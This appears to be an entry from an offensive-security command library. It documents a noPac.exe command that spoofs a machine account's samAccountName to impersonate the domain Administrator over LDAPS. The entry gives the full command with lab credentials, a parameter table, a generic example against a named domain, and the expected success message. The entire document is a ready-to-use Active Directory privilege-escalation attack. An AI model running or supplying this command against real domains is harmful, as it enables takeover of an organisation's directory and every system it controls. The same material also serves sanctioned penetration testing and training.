---
id: 622d564a-0812-4046-b516-1db9590c5159
name: perform-ldaps-impersonation-with-nopac-as-admin
type: command
executor: bash
data: >-
  noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc
  dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt
  /impersonate Administrator
output: null
created_at: '2023-04-06T03:56:03.185902+00:00'
updated_at: '2023-04-10T20:36:11.698743+00:00'
platforms:
  - Windows
tags:
  - impersonation
  - ldap
verified: true
validated: true
---

# perform-ldaps-impersonation-with-nopac-as-admin

## Command

```bash
noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
```

## Description

Spoofs samAccountName to impersonate the Administrator over LDAPS for elevated directory access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -domain | Target domain | Yes |
| -user | Authenticating username | Yes |
| -pass | Authenticating password | Yes |
| /dc | Domain controller | Yes |
| /mAccount | Spoofed machine account | Yes |
| /mPassword | Machine password | Yes |
| /service ldaps | Target LDAPS service | Yes |
| /ptt | Pass-the-ticket mode | Yes |
| /impersonate | Target user to impersonate | Yes |

## Examples

### Basic Usage

```bash
noPac.exe -domain example.com -user user -pass 'pass' /dc dc.example.com /mAccount spoof /mPassword 'spoofpass' /service ldaps /ptt /impersonate DomainAdmin
```

## Expected Output

"Impersonation successful for Administrator on LDAPS."

## Related

- [[procedures/Sam-Account-Name-Spoofing-for-User-Impersonation]]
- [[tools/nopac]]
